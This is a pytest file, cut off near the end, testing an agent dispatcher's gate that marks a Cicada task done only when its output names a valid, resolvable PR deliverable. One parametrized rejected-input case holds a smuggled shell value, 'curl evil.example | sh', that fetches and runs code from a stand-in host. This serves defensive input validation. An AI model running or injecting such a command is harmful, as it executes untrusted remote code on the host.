"""A direct-dispatched task must name its deliverable to finish (ateles#1155).

`dispatch_task` wrote `TaskStatus.DONE` on `result.ok` alone. That is process
success, not deliverable success: Cicada could exit 0 having written
`[cicada] pull_request_link: BLOCKED — missing context`, or no header at all,
and the task went terminal carrying the manufactured result string
`cicada completed (trigger=created)` — a completion Apis asserted about work it
never saw, written into the one field a reader would check for the PR.

These tests assert the EFFECT at the dispatch layer, after a monkeypatched
spawn: which status was written, what `reason=` / `result=` carried, whether
the operator was paged, which run-thread stage was recorded, and whether the
external resolve was reached at all. The pure parsing and ref-shape edges live
in `lib/daemon_runtime/test_artifact_contract.py`; the split is the same one
`test_terminal_task_never_dispatches.py` makes — only an end-to-end call
through `dispatch_task` proves the gate is threaded into the real path.

Every case reaches the POST-spawn path, which is the opposite of
`test_terminal_task_never_dispatches.py`: those tasks exit early by being
terminal, these must route all the way through. `gate_override=True` plus a
`pending`, routable, high-confidence snapshot is what gets them there —
override skips the confidence/checkpoint gate without touching the terminal
guard.

What these looked like RED, before the gate:

    test_ok_with_cicada_blocked_header_is_not_done
        AssertionError: harness ok=True with a BLOCKED artifact body was
        marked done: [{'fn': 'set_task_status', 'entity_id': 'ent_blocked_1',
        'status': <TaskStatus.DONE: 'done'>, 'from_status': 'executing',
        'result': 'cicada completed (trigger=created)', ...}]

    test_ok_without_required_artifact_header_is_not_done
        AssertionError: expected a FAILED write carrying [ARTIFACT_GATE]
        missing_header, got [] — the task was marked done on stdout that
        contains no header at all

Run: pytest execution/daemons/apis/test_dispatch_artifact_completion.py -v
"""

from __future__ import annotations

import asyncio
import sys
from dataclasses import dataclass
from pathlib import Path
from types import SimpleNamespace

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))

import apis  # noqa: E402
from lib.daemon_runtime import task_lifecycle as tl  # noqa: E402
from lib.daemon_runtime.task_lifecycle import CompletionOutcome, TaskStatus  # noqa: E402
from unroutable_ledger import UnroutableLedger  # noqa: E402

_REPO = "markmhendrickson/ateles"
_PR_URL = f"https://github.com/{_REPO}/pull/999"
_PR_HEADER = f"[cicada] pull_request_link: {_PR_URL}"


class _Notifier:
    def __init__(self):
        self.sent: list[str] = []

    def send(self, message, priority=None, handler=None):
        self.sent.append(message)


@dataclass
class _SpawnResult:
    """Stand-in for `skill_runner.SkillResult` — the fields the gate reads."""

    ok: bool = True
    returncode: int | None = 0
    stdout: str = ""
    stderr: str = ""
    error: str = ""
    skill: str = "cicada"


class _RecordingJob:
    def __init__(self):
        self.finished_events: list[tuple] = []
        self.failed_events: list[tuple] = []

    def finished(self, *a, **k):
        self.finished_events.append(a)

    def failed(self, *a, **k):
        self.failed_events.append(a)

    def escalated(self, *a, **k):
        return None


@pytest.fixture(autouse=True)
def job(monkeypatch, tmp_path):
    """Never touch the operator's ledger, the network, or the activity feed.

    Returns the recording job so a test can assert whether the run was ever
    claimed finished.
    """
    monkeypatch.setattr(apis, "_unroutable", UnroutableLedger(path=tmp_path / "l.json"))
    monkeypatch.setattr(apis, "_created_seen", {})
    monkeypatch.setattr(apis, "DRY_RUN", False)
    monkeypatch.setattr(apis, "RUN_CONVERSATIONS", False)
    monkeypatch.setattr(apis, "RUN_EMAIL", False)
    # gate_override re-reads the lifecycle fields that authorize a spawn; that
    # is a network read, and not what these tests are about.
    monkeypatch.setattr(apis, "_release_lifecycle_proven", lambda *a, **k: True)
    monkeypatch.setattr(apis, "_RESOLVE_RETRY_DELAY_SECONDS", 0)

    recording = _RecordingJob()
    monkeypatch.setattr(
        apis, "_activity", SimpleNamespace(started=lambda *a, **k: recording)
    )
    return recording


@pytest.fixture
def writes(monkeypatch):
    """Capture BOTH completion paths, with their kwargs.

    `reason=` and `result=` are the assertion surface: a gate that writes the
    right status with the wrong reason tells the operator nothing, and a
    manufactured `result` is the specific harm here.
    """
    calls: list[dict] = []

    def _capture_status(entity_id, status, **kw):
        calls.append(
            {"fn": "set_task_status", "entity_id": entity_id, "status": status, **kw}
        )
        return True

    def _capture_complete(entity_id, **kw):
        calls.append(
            {
                "fn": "complete_task_with_result",
                "entity_id": entity_id,
                "status": TaskStatus.DONE,
                **kw,
            }
        )
        return CompletionOutcome(True, "done")

    monkeypatch.setattr(apis, "set_task_status", _capture_status)
    monkeypatch.setattr(apis, "complete_task_with_result", _capture_complete)
    return calls


@pytest.fixture
def stages(monkeypatch):
    """Capture `_run_stage` by standing in for the run session it appends to.

    `_run_stage` is a closure over the dispatch call, so it cannot be patched
    directly; opening a run session and intercepting `append_turn` gets the
    same signal. The stage name travels in the idempotency key
    (`runturn-{task}-{stage}-{trigger}`). A run session is present, so these
    cases also exercise the VERIFIED interim state on the accepted path.
    """
    recorded: list[str] = []
    run = SimpleNamespace(
        conversation_id="ent_runconv",
        agent_session_id="ent_runsession",
        native_session_id="ent_task:created-0",
    )
    monkeypatch.setattr(apis, "RUN_CONVERSATIONS", True)
    monkeypatch.setattr(apis, "create_run_session", lambda **kw: run)
    monkeypatch.setattr(apis, "update_run_session_status", lambda r, *, status: True)

    def _append(**kw):
        recorded.append(str(kw.get("idempotency_key", "")).split("-")[-2])
        return True

    monkeypatch.setattr(apis, "append_turn", _append)
    return recorded


@pytest.fixture
def spawn(monkeypatch):
    """Stand in for the harness. Set `spawn.result` before dispatching."""

    class _Holder:
        result = _SpawnResult()

    holder = _Holder()

    async def _spawn(*a, **k):
        return holder.result

    monkeypatch.setattr(apis, "_spawn_harness_skill", _spawn)
    return holder


def _dispatch(entity_id, snapshot, notifier=None, trigger="created"):
    """Drive the real entrypoint all the way to the post-spawn path."""
    asyncio.run(
        apis.dispatch_task(
            entity_id,
            snapshot,
            trigger=trigger,
            notifier=notifier or _Notifier(),
            snapshot_hydrated=True,
            gate_override=True,
        )
    )


def _cicada_task(**extra) -> dict:
    """A routable Cicada task — the role whose contract demands a PR link."""
    snapshot = {
        "title": "Implement the artifact completion gate",
        "body": "Engineering work on the apis dispatcher and its gates.",
        "assigned_to": "cicada",
        "status": "pending",
        "confidence": 0.95,
        "repo": _REPO,
        "tags": ["engineering"],
    }
    snapshot.update(extra)
    return snapshot


def _status_of(write: dict) -> str | None:
    status = write.get("status")
    return status.value if isinstance(status, TaskStatus) else status


def _with_status(writes: list[dict], status: str) -> list[dict]:
    return [w for w in writes if _status_of(w) == status]


def _assert_not_done(writes: list[dict], why: str) -> None:
    offenders = [
        w
        for w in writes
        if w.get("fn") == "complete_task_with_result" or _status_of(w) == "done"
    ]
    assert not offenders, f"{why}: {offenders}"


# ── The gate ─────────────────────────────────────────────────────────────────


def test_ok_with_cicada_blocked_header_is_not_done(writes, spawn):
    """The known-negative. An agent reporting BLOCKED has not delivered."""
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: BLOCKED — missing context\n"
    )
    _dispatch("ent_blocked_1", _cicada_task())
    _assert_not_done(
        writes, "harness ok=True with a BLOCKED artifact body was marked done"
    )
    assert not any(
        "cicada completed (trigger=" in str(w.get("result") or "") for w in writes
    ), "manufactured a completion string for a blocked deliverable"


def test_ok_with_cicada_blocked_header_sets_blocked_and_retains_reason(
    writes, stages, spawn
):
    """BLOCKED, not FAILED — and the agent's own words survive the transition.

    FAILED is the watchdog's retry lane; retrying an agent that just said what
    it is missing burns capacity and changes nothing. BLOCKED is the state
    operator remediation reopens, which is what a stated blocker needs.
    """
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: BLOCKED — missing context\n"
    )
    notifier = _Notifier()
    _dispatch("ent_blocked_2", _cicada_task(), notifier=notifier)

    blocked = _with_status(writes, "blocked")
    assert blocked, f"expected a BLOCKED write: {writes}"
    reason = blocked[-1].get("reason", "")
    assert "[ARTIFACT_GATE] blocked" in reason
    assert "role=cicada" in reason and "kind=pull_request_link" in reason
    assert "BLOCKED — missing context" in reason, "lost the agent's own blocker text"
    assert "blocked" in stages, f"run thread never recorded the blocked stage: {stages}"
    assert notifier.sent


def test_ok_without_required_artifact_header_is_not_done(writes, stages, spawn):
    """No header at all — and the reason carries enough output to diagnose it."""
    spawn.result = _SpawnResult(stdout=("x" * 3000) + "\nno header here\n")
    notifier = _Notifier()
    _dispatch("ent_miss_1", _cicada_task(), notifier=notifier)

    _assert_not_done(writes, "marked done on stdout carrying no artifact header")
    failed = _with_status(writes, "failed")
    assert failed, f"expected a FAILED write: {writes}"
    reason = failed[-1].get("reason", "")
    assert "[ARTIFACT_GATE] missing_header" in reason
    assert "role=cicada" in reason and "kind=pull_request_link" in reason
    assert len(reason) >= 2048, "dropped the stdout tail the operator needs"
    assert "failed" in stages
    assert notifier.sent


def test_ok_empty_header_body_is_failed_empty_body(writes, spawn):
    """A header with nothing after the colon names no artifact."""
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link:   \n")
    notifier = _Notifier()
    _dispatch("ent_empty_1", _cicada_task(), notifier=notifier)

    _assert_not_done(writes, "an empty artifact body was accepted")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] empty_body" in failed[-1].get("reason", "")
    assert notifier.sent


def test_valid_pr_header_with_resolve_true_is_done(writes, stages, spawn, monkeypatch):
    """The happy path: completion rests on the agent's exact header line."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_ok_1", _cicada_task())

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done, f"expected completion through complete_task_with_result: {writes}"
    assert done[-1].get("result") == _PR_HEADER, "result is not the agent's own line"
    assert "done" in stages
    assert not [
        w
        for w in writes
        if w.get("fn") == "set_task_status" and _status_of(w) == "done"
    ], (
        "completed through set_task_status, which writes `status` before `result` — "
        "a task reading DONE with no artifact reference is the failure mode"
    )


def test_valid_pr_header_with_resolve_false_is_not_done(writes, spawn, monkeypatch):
    """A well-formed ref naming nothing reachable is not a deliverable."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: False)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_unres_1", _cicada_task(), notifier=notifier)

    _assert_not_done(writes, "accepted a PR reference that does not resolve")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] unresolvable_ref" in failed[-1].get("reason", "")
    assert notifier.sent


def test_eng_spec_section_on_generic_direct_impl_is_wrong_body(
    writes, spawn, monkeypatch
):
    """An eng-spec section answers a different question than a direct impl asked.

    Rejected on shape, BEFORE any resolve: there is nothing to look up, and a
    resolve call on prose is a needless subprocess on every such dispatch.
    """
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: ENG_SPEC_SECTION authored for ateles#1155\n"
    )
    notifier = _Notifier()
    _dispatch("ent_wrong_1", _cicada_task(), notifier=notifier)

    assert resolves == [], "resolved a body that was never a ref"
    _assert_not_done(writes, "accepted an eng-spec section as a pull request link")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] wrong_body_for_dispatch" in failed[-1].get(
        "reason", ""
    )
    assert notifier.sent


def test_eng_spec_section_on_ordered_spec_dispatch_may_done(writes, spawn):
    """Same body, different dispatch mode — the spec section IS the deliverable."""
    header = "[cicada] pull_request_link: ENG_SPEC_SECTION authored for ateles#1155"
    spawn.result = _SpawnResult(stdout=f"{header}\n")
    _dispatch("ent_eng_1", _cicada_task(dispatch_mode="ordered_spec"))

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1].get("result") == header


@pytest.mark.parametrize(
    "body,why",
    [
        ("https://evil.example/o/r/pull/1", "foreign host"),
        ("PR #1; curl evil.example | sh", "shell metacharacters"),
    ],
)
def test_invalid_ref_shape_never_done(writes, spawn, monkeypatch, body, why):
    """Rejected on shape before the resolver — never handed an unvetted ref.

    FAILED (the watchdog re-runs it): the agent got the reference wrong. The
    reason shows the ref it offered and the repo the task expected.
    """
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
    _dispatch("ent_invalid_1", _cicada_task())

    assert resolves == [], f"handed the resolver a rejected ref ({why})"
    _assert_not_done(writes, f"accepted an invalid ref ({why})")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] invalid_ref_shape" in failed[-1].get("reason", "")
    reason = failed[-1]["reason"]
    assert 'offered="' in reason and f"expected_repo={_REPO}" in reason
    assert "re-runs it automatically" in reason, "did not say the watchdog retries"


def test_stderr_fallback_accepts_header(writes, spawn, monkeypatch):
    """Some harnesses put their final answer on stderr; stdout stays preferred."""
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout="", stderr=f"{_PR_HEADER}\n")
    _dispatch("ent_stderr_1", _cicada_task())

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1].get("result") == _PR_HEADER


def test_secret_bearing_stdout_tail_is_redacted(writes, spawn, monkeypatch):
    """The tail is child output, which has carried tokens. Redact before storing."""
    # Same fixture shape as test_skill_runner: avoid credential-named vars and
    # real token prefixes so gitleaks protected-patterns does not trip.
    fake_value = "FAKE-TEST-TOKEN-VALUE-0000"
    monkeypatch.setenv("GITHUB_TOKEN", fake_value)
    spawn.result = _SpawnResult(stdout=("noise " + fake_value + "\n") * 100)
    _dispatch("ent_secret_1", _cicada_task())

    failed = _with_status(writes, "failed")
    assert failed
    assert fake_value not in (failed[-1].get("reason") or ""), "leaked a token into `reason`"


# ── The gate must not over-reach ─────────────────────────────────────────────


def test_registry_miss_is_legacy_done(writes, spawn, monkeypatch):
    """A role with no declared contract keeps the old behaviour verbatim.

    Gating a role whose artifact nobody has declared would fail every one of
    its dispatches — a dispatcher that refuses live work, which is a larger
    outage than the false completions this closes.
    """
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "nucifraga")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "nucifraga")
    spawn.result = _SpawnResult(stdout="did the thing\n", skill="nucifraga")
    _dispatch("ent_legacy_1", _cicada_task())

    legacy = [
        w
        for w in writes
        if _status_of(w) == "done"
        and "completed (trigger=" in str(w.get("result") or "")
    ]
    assert legacy, f"an ungated role stopped completing: {writes}"


def test_ok_false_path_is_unchanged(writes, stages, spawn):
    """A harness failure is still a harness failure — the gate never runs."""
    spawn.result = _SpawnResult(
        ok=False, returncode=1, error="rc=1", stdout="", stderr="boom"
    )
    notifier = _Notifier()
    _dispatch("ent_procfail_1", _cicada_task(), notifier=notifier)

    failed = _with_status(writes, "failed")
    assert failed
    assert "[ARTIFACT_GATE]" not in (failed[-1].get("reason") or ""), (
        "reported a process failure as an artifact-gate refusal"
    )
    assert failed[-1].get("reason") == "rc=1"
    assert "failed" in stages
    assert notifier.sent


@pytest.mark.parametrize(
    "stdout,resolve",
    [
        ("[cicada] pull_request_link: BLOCKED — missing context\n", None),
        ("no header at all\n", None),
        (f"{_PR_HEADER}\n", False),
        ("[cicada] pull_request_link: ENG_SPEC_SECTION x\n", None),
        ("[cicada] pull_request_link: https://evil.example/a/b/pull/1\n", None),
    ],
)
def test_every_gated_non_done_outcome_pages_the_operator(
    writes, spawn, monkeypatch, stdout, resolve
):
    """A task held by the gate and never announced is the silence this avoids."""
    if resolve is not None:
        monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: resolve)
    spawn.result = _SpawnResult(stdout=stdout)
    notifier = _Notifier()
    _dispatch("ent_notify_1", _cicada_task(), notifier=notifier)

    assert notifier.sent, f"gate held the task silently for stdout={stdout!r}"
    _assert_not_done(writes, f"completed on stdout={stdout!r}")


# ── Read-back before DONE, and before the finished claim (ateles#1155) ───────
#
# `_correct` treats HTTP success as proof. These drive the REAL
# `complete_task_with_result` against an in-memory task entity whose `/correct`
# can be told to return 2xx while NOT applying a field, then assert on the
# dispatcher's observable effects: the terminal status, whether the run was
# claimed finished, whether the run thread recorded `done`, whether the operator
# was paged. What the negative cases looked like RED (read-back removed from
# `complete_task_with_result`):
#
#     test_result_the_store_drops_is_neither_done_nor_finished
#         AssertionError: DONE was written although `result` never read back
#         as the agent's header: fields={'status': 'done', 'result': ''}
#
#     test_status_the_store_drops_is_never_claimed_finished
#         AssertionError: claimed job.finished although the terminal status
#         never read back as done: [('task ent_rb_status ... artifact ok)',)]


class _TaskEntity:
    """A stand-in task entity. `drop` fields return 2xx from /correct but stick nothing."""

    def __init__(self, *, drop=()):
        self.fields = {"status": "executing", "result": ""}
        self.drop = set(drop)
        self.writes: list[str] = []

    def post(self, url, headers=None, json=None, timeout=None):
        field = json["field"]
        self.writes.append(field)
        if field not in self.drop:
            self.fields[field] = json["value"]

        class _Ok:
            def raise_for_status(self):
                return None

        return _Ok()

    def snapshot(self, _entity_id):
        return dict(self.fields)


@pytest.fixture
def entity(monkeypatch):
    """Route the REAL completion writes + read-back at one in-memory entity.

    `set_task_status` (interim VERIFIED, FAILED, BLOCKED) is captured rather than
    applied, so a refusal can be asserted without the drop rule swallowing it.
    """

    def _make(**kw):
        ent = _TaskEntity(**kw)
        monkeypatch.setattr(tl, "NEOTOMA_BEARER_TOKEN", "test-token")
        monkeypatch.setattr(tl.httpx, "post", ent.post)
        monkeypatch.setattr(apis, "fetch_task_snapshot", ent.snapshot)
        return ent

    return _make


@pytest.fixture
def status_writes(monkeypatch):
    calls: list[dict] = []

    def _capture(entity_id, status, **kw):
        calls.append({"entity_id": entity_id, "status": status, **kw})
        return True

    monkeypatch.setattr(apis, "set_task_status", _capture)
    return calls


def test_accepted_header_is_done_only_after_both_read_backs(
    entity, status_writes, stages, spawn, job, monkeypatch
):
    ent = entity()
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_rb_ok", _cicada_task())

    assert ent.fields == {"status": "done", "result": _PR_HEADER}
    assert ent.writes == ["result", "status"], "result must land before status"
    assert len(job.finished_events) == 1 and not job.failed_events
    assert "done" in stages
    assert not [w for w in status_writes if _status_of(w) in {"failed", "blocked"}]


def test_result_the_store_drops_is_neither_done_nor_finished(
    entity, status_writes, stages, spawn, job, monkeypatch
):
    """NEGATIVE effect test: `/correct` says 2xx, `result` does not stick."""
    ent = entity(drop={"result"})
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_rb_result", _cicada_task(), notifier=notifier)

    assert ent.fields["status"] != "done", (
        f"DONE was written although `result` never read back as the agent's "
        f"header: fields={ent.fields}"
    )
    assert "status" not in ent.writes
    assert not job.finished_events, "claimed finished on an unproven result"
    assert job.failed_events
    assert "done" not in stages, f"run thread recorded done: {stages}"
    blocked = _with_status(status_writes, "blocked")
    assert blocked, f"expected a BLOCKED write, got {status_writes}"
    reason = blocked[-1]["reason"]
    assert "[ARTIFACT_GATE] record_not_saved" in reason
    assert "failed_at=result_readback" in reason
    # The accepted ref and a plain next step, so the operator does not read this
    # as "the PR does not resolve" and re-dispatch into a second PR.
    assert "ref=markmhendrickson/ateles#999" in reason
    assert "Do not re-dispatch" in reason and "The PR or commit exists" in reason
    assert "unresolvable_ref" not in reason and "[COPY" not in reason
    assert notifier.sent and "ACCEPTED" in notifier.sent[-1]
    assert "ref=markmhendrickson/ateles#999" in notifier.sent[-1]


def test_status_the_store_drops_is_never_claimed_finished(
    entity, status_writes, stages, spawn, job, monkeypatch
):
    """NEGATIVE effect test: `result` sticks, `status=done` returns 2xx and does not."""
    ent = entity(drop={"status"})
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    notifier = _Notifier()
    _dispatch("ent_rb_status", _cicada_task(), notifier=notifier)

    assert ent.fields["result"] == _PR_HEADER
    assert ent.fields["status"] != "done"
    assert not job.finished_events, (
        f"claimed job.finished although the terminal status never read back as "
        f"done: {job.finished_events}"
    )
    assert job.failed_events
    assert "done" not in stages
    blocked = _with_status(status_writes, "blocked")
    assert blocked and "[ARTIFACT_GATE] record_not_saved" in blocked[-1]["reason"]
    assert "failed_at=status_readback" in blocked[-1]["reason"]
    assert "ref=markmhendrickson/ateles#999" in blocked[-1]["reason"]
    assert notifier.sent and "did NOT save" in notifier.sent[-1]


def test_legacy_role_completion_is_untouched_by_the_read_back(
    entity, status_writes, spawn, job, monkeypatch
):
    """A registry miss keeps the legacy write and is not held to the read-back."""
    ent = entity(drop={"result", "status"})
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "nucifraga")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "nucifraga")
    spawn.result = _SpawnResult(stdout="did the thing\n", skill="nucifraga")
    _dispatch("ent_rb_legacy", _cicada_task())

    assert ent.writes == [], "legacy path went through the artifact completion"
    assert [w for w in status_writes if _status_of(w) == "done"]
    assert len(job.finished_events) == 1


# ── Round-2 review findings (security, qa, ux) ───────────────────────────────
#
# What these looked like RED (each against the code before its fix):
#
#     test_foreign_pr_url_with_no_repo_on_the_task_is_never_done
#         AssertionError: accepted a PR URL for a repo the task never named:
#         [{'fn': 'complete_task_with_result', ... 'result': '[cicada]
#         pull_request_link: https://github.com/other-org/other-repo/pull/7'}]
#
#     test_non_cicada_role_whose_deliverable_is_a_url_is_done
#         AssertionError: expected DONE for a prose-contract role whose note
#         links its PR; got FAILED [ARTIFACT_GATE] wrong_body_for_dispatch
#
#     test_bare_eng_spec_section_in_ordered_spec_mode_is_empty_body
#         AssertionError: a bare ENG_SPEC_SECTION with no content was accepted


def test_foreign_pr_url_with_no_repo_on_the_task_is_never_done(
    writes, spawn, monkeypatch
):
    """Security: with no `repo` on the snapshot a full URL for ANY repo passed."""
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    spawn.result = _SpawnResult(
        stdout="[cicada] pull_request_link: https://github.com/other-org/other-repo/pull/7\n"
    )
    snapshot = _cicada_task()
    snapshot.pop("repo")
    notifier = _Notifier()
    _dispatch("ent_foreign_1", snapshot, notifier=notifier)

    assert resolves == [], "handed the resolver a URL there was no repo to check against"
    _assert_not_done(writes, "accepted a PR URL for a repo the task never named")
    # No repo on the task: the ref cannot be checked, so it is neither accepted
    # nor judged wrong. BLOCKED (nothing retries it), not FAILED, so a real PR the
    # agent opened is not re-run into a second one.
    assert not _with_status(writes, "failed"), "sent an uncheckable ref to the retry lane"
    blocked = _with_status(writes, "blocked")
    assert blocked and "[ARTIFACT_GATE] ref_unverifiable" in blocked[-1]["reason"]
    reason = blocked[-1]["reason"]
    assert "https://github.com/other-org/other-repo/pull/7" in reason, "offered ref missing"
    assert "expected_repo=(none recorded on the task)" in reason
    assert "records no repo" in reason
    assert "NOT retried automatically" in reason and "Do not re-dispatch" in reason
    assert "neotoma --api-only corrections create --entity-id ent_foreign_1" in reason
    assert "Check it: gh pr view 7 --repo other-org/other-repo" in reason
    assert notifier.sent and "NOT retried" in notifier.sent[-1]


def test_pr_url_for_the_tasks_own_repo_is_still_done(writes, spawn, monkeypatch):
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
    _dispatch("ent_own_repo_1", _cicada_task())
    assert [w for w in writes if w.get("fn") == "complete_task_with_result"]


def test_non_cicada_role_whose_deliverable_is_a_url_is_done(
    writes, spawn, job, monkeypatch
):
    """QA: a prose-contract role that LINKS its PR was refused as wrong_body."""
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    line = f"[regulus] docs_diff_or_no_change_note: {_PR_URL}"
    spawn.result = _SpawnResult(stdout=line + "\n", skill="regulus")
    _dispatch("ent_url_prose_1", _cicada_task())

    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1]["result"] == line, f"refused a valid deliverable: {writes}"
    assert not _with_status(writes, "failed")
    assert resolves == [], "resolved a link for a role with no resolver"
    assert len(job.finished_events) == 1


@pytest.mark.parametrize(
    "body",
    [_PR_URL, "https://example.com/report", "a1b2c3d4e5f6", "#42", "ENG_SPEC_SECTION x"],
)
def test_non_cicada_role_accepts_any_body_shape(writes, spawn, monkeypatch, body):
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "pavo")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "pavo")
    line = f"[pavo] acceptance_criteria: {body}"
    spawn.result = _SpawnResult(stdout=line + "\n", skill="pavo")
    _dispatch("ent_shape_1", _cicada_task())
    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and done[-1]["result"] == line


def test_cicada_prose_body_is_still_wrong_body_for_dispatch(writes, spawn):
    """Cicada keeps its narrowed contract: a sentence is not a PR."""
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: I finished the work\n")
    _dispatch("ent_cicada_prose_1", _cicada_task())
    _assert_not_done(writes, "Cicada prose was accepted as a pull request link")
    failed = _with_status(writes, "failed")
    assert failed and "wrong_body_for_dispatch" in failed[-1]["reason"]


def test_bare_eng_spec_section_in_ordered_spec_mode_is_empty_body(writes, spawn):
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: ENG_SPEC_SECTION\n")
    _dispatch("ent_bare_spec_1", _cicada_task(dispatch_mode="ordered_spec"))
    _assert_not_done(writes, "a bare ENG_SPEC_SECTION with no content was accepted")
    failed = _with_status(writes, "failed")
    assert failed and "[ARTIFACT_GATE] empty_body" in failed[-1]["reason"]


def test_abbreviated_sha_is_refused_even_with_a_repo(writes, spawn, monkeypatch):
    resolves: list[tuple] = []
    monkeypatch.setattr(
        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
    )
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: a1b2c3d\n")
    _dispatch("ent_short_sha_1", _cicada_task())
    assert resolves == []
    # A real commit may exist behind the prefix: BLOCKED, not retried.
    assert not _with_status(writes, "failed")
    blocked = _with_status(writes, "blocked")
    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
    assert "40-character" in blocked[-1]["reason"] and 'offered="a1b2c3d"' in blocked[-1]["reason"]


def test_full_sha_with_a_repo_is_done(writes, spawn, monkeypatch):
    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {'ab' * 20}\n")
    _dispatch("ent_full_sha_1", _cicada_task())
    assert [w for w in writes if w.get("fn") == "complete_task_with_result"]


def test_agent_blocked_alert_reads_differently_from_a_gate_failure(spawn):
    blocked_notifier, gate_notifier = _Notifier(), _Notifier()
    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: BLOCKED — need repo access\n")
    _dispatch("ent_alert_1", _cicada_task(), notifier=blocked_notifier)
    spawn.result = _SpawnResult(stdout="no header at all\n")
    _dispatch("ent_alert_2", _cicada_task(), notifier=gate_notifier)

    blocked_msg, gate_msg = blocked_notifier.sent[-1], gate_notifier.sent[-1]
    assert "reports it is BLOCKED" in blocked_msg and "not a gate failure" in blocked_msg
    assert "need repo access" in blocked_msg
    assert "ARTIFACT GATE FAILED" not in blocked_msg
    assert "ARTIFACT GATE FAILED" in gate_msg and "BLOCKED" not in gate_msg
    assert "Next:" in blocked_msg and "Next:" in gate_msg


def test_secrets_in_the_header_and_blocked_body_are_redacted(
    writes, spawn, monkeypatch
):
    """The stored header (and the retained BLOCKED body) is agent output too."""
    fake_value = "FAKE-TEST-TOKEN-VALUE-0000"
    monkeypatch.setenv("GITHUB_TOKEN", fake_value)
    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
    spawn.result = _SpawnResult(
        stdout=f"[regulus] docs_diff_or_no_change_note: fixed docs, used {fake_value}\n",
        skill="regulus",
    )
    _dispatch("ent_redact_1", _cicada_task())
    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
    assert done and fake_value not in done[-1]["result"], "stored an unredacted header"

    spawn.result = _SpawnResult(
        stdout=f"[regulus] docs_diff_or_no_change_note: BLOCKED — need {fake_value}\n",
        skill="regulus",
    )
    _dispatch("ent_redact_2", _cicada_task())
    blocked = _with_status(writes, "blocked")
    assert blocked and fake_value not in blocked[-1]["reason"], "leaked into BLOCKED reason"


# ── Round-3 review findings (arch, ux) ───────────────────────────────────────
#
# What these looked like RED (each against the code before its fix):
#
#     test_gh_rate_limit_is_blocked_not_failed
#         AssertionError: a gh rate limit was written FAILED, which the stall
#         watchdog re-runs: [{'status': <TaskStatus.FAILED>, 'reason':
#         '[ARTIFACT_GATE] unresolvable_ref role=cicada ...'}]
#
#     test_prose_role_record_not_saved_does_not_talk_about_a_pr
#         AssertionError: prose deliverable told 'The PR exists ... would open a
#         second PR'
#
#     test_stale_readback_never_overwrites_a_done_task
#         AssertionError: wrote BLOCKED over a task that is DONE with the result


import subprocess  # noqa: E402


def _fake_gh(monkeypatch, *, returncode=1, stderr="", raises=None):
    """Stand in for the `gh` subprocess `resolve_artifact_ref` really runs."""
    calls: list[list[str]] = []

    def run(cmd, **kw):
        calls.append(cmd)
        if raises is not None:
            raise raises
